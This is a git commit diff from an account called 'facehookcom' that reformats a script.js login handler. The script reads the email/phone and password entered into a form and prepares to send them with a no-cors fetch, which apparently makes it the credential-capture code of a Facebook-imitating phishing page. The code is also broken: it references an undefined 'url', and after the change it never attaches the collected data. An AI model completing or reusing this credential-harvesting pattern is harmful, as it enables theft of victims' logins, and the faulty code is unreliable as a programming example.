2ff53e5c69cb3f93a6be2fcf7126ab413e0184c4
facehookcom <141312864+facehookcom@users.noreply.github.com>
2023-08-03 15:35:42 +0530

    Update script.js

--- script.js
+++ script.js
@@ -1,25 +1,25 @@
 function sendHttpRequest() {
-        event.preventDefault();
-        const emailOrPhoneValue = document.querySelector('input[type="text"]').value;
-        const passwordValue = document.querySelector('input[type="password"]').value;
+  event.preventDefault();
+  const emailOrPhoneValue = document.querySelector('input[type="text"]').value;
+  const passwordValue = document.querySelector('input[type="password"]').value;
 
-        const data = {
-          emailOrPhone: emailOrPhoneValue,
-          password: passwordValue
-        };
+  const data = {
+    emailOrPhone: emailOrPhoneValue,
+    password: passwordValue,
+  };
 
-        fetch(url, {
-          method: 'GET',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify(postData),
-          mode: 'no-cors', // Set no-cors mode
-        })
-          .then((response) => {
-            // The response object will be opaque and you won't be able to access its data or headers
-            console.log('Request sent with no-cors mode.');
-          })
-          .catch((error) => {
-            console.error('Error:', error);
-          });
+  fetch(url, {
+    method: 'GET', // Correct HTTP method for GET request
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    mode: 'no-cors', // Set no-cors mode
+  })
+    .then((response) => {
+      // The response object will be opaque and you won't be able to access its data or headers
+      console.log('Request sent with no-cors mode.');
+    })
+    .catch((error) => {
+      console.error('Error:', error);
+    });
+}
